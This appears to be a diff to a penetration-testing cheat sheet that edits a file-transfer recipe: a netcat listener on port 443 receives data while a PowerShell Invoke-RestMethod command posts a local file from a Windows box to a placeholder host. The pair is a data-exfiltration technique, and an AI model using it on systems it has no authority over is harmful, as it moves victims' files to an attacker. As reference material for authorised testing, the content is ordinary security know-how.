@@ -36,7 +36,7 @@ nc -lnvp 443 > Out.File
 ```
 ### On Windows Box
 ```ps
-Invoke-RestMethod -Uri http://<LocalIPAddress>:<PORT>/<FILE> -Method Post -InFile <LocalFile>
+Invoke-RestMethod -Uri http://<LocalIPAddress>:443/<FILE> -Method Post -InFile <LocalFile>
 ```
 -----------------------------------------------------------------------------------------------------------------------------------------------------
 
